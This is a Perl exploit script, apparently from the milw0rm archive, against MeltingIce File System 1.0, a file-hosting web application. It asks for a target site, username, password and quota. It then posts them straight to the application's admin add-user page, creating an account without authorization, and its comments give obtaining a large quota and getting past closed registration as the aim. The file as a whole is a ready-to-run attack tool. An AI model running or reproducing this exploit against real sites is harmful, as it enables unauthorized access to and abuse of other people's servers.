#!/usr/bin/perl

use strict;
use LWP::UserAgent;

# NOTE: user a pretty uniqe username, has the script will say successfull if a username aready existed!
# NOTE: exploit is mainly to get a nice quota, but it can also to be used to add a user primeraly because alot of these sites doesnt allow registration.
# Script Download: http://downloads.sourceforge.net/meltingicefs

print "[*] --- [ MeltingIce File System <= 1.0 Remote Arbitrary Add-User ] --- [*]\n";
print "[*] ---Discovered && Coded By: t0pP8uZz / Discovered On: 17 MAY 2008--- [*]\n";
print "[*] --- MeltingIce is a file hosting script, this exploit will add  --- [*]\n";
print "[*] --- a user via the admin panel, and give it a specified quota.  --- [*]\n";
print "[*] --- [ MeltingIce File System <= 1.0 Remote Arbitrary Add-User ] --- [*]\n";

print "\nEnter URL(http://site.com/): ";
	chomp(my $url=<STDIN>);
	
print "\nUsername(create's your username): ";
	chomp(my $usr=<STDIN>);
	
print "\nPassword(create's your password): ";
	chomp(my $pwd=<STDIN>);
	
print "\nEnter Quota(quota(mb) of space you want, ie:9999): ";
	chomp(my $qta=<STDIN>);

my $ua = LWP::UserAgent->new( agent => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" );
my $ob = $ua->post($url."/admin/adduser.php", { "newusername" => $usr, "newpassword" => $pwd, "newquota" => $qta } );

#is_success was acting strangely, so i had to do without.
print "Completed! Try logging in ".$url."\n"; 
exit;

# milw0rm.com [2008-05-18]
